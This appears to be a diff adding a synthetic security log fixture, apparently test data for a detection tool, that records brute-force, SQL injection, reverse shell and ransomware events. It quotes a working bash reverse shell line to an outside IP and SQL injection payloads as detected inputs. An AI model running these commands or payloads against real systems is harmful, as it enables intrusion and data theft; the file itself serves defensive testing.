@@ -1,0 +1,13 @@
+2025-09-14 11:01:23 INFO User admin login failed from 185.23.45.67
+2025-09-14 11:01:24 WARNING Failed password for root from 185.23.45.67 port 445 ssh2
+2025-09-14 11:01:25 WARNING Failed password for root from 185.23.45.67 port 446 ssh2
+2025-09-14 11:01:27 WARNING Failed password for root from 185.23.45.67 port 447 ssh2
+2025-09-14 11:01:30 CRITICAL Possible brute force attack detected from 185.23.45.67
+2025-09-14 11:02:10 ERROR SQL Injection attempt: "UNION SELECT password FROM users WHERE '1'='1'"
+2025-09-14 11:02:15 ERROR Malicious input detected: "OR '1'='1' --"
+2025-09-14 11:03:00 CRITICAL Reverse shell attempt detected: "/bin/bash -i >& /dev/tcp/185.23.45.90/4444 0>&1"
+2025-09-14 11:04:00 ALERT Ransomware activity: file encrypted C:\Users\john\Desktop\important.docx.locked
+2025-09-14 11:04:05 ALERT Multiple files encrypted in directory C:\Users\john\Documents\
+2025-09-14 11:05:00 CRITICAL Host may be compromised. Immediate isolation recommended.
+...
+(repeat brute force + sql injection + reverse shell + ransomware keywords scattered across ~5000–6000 lines)
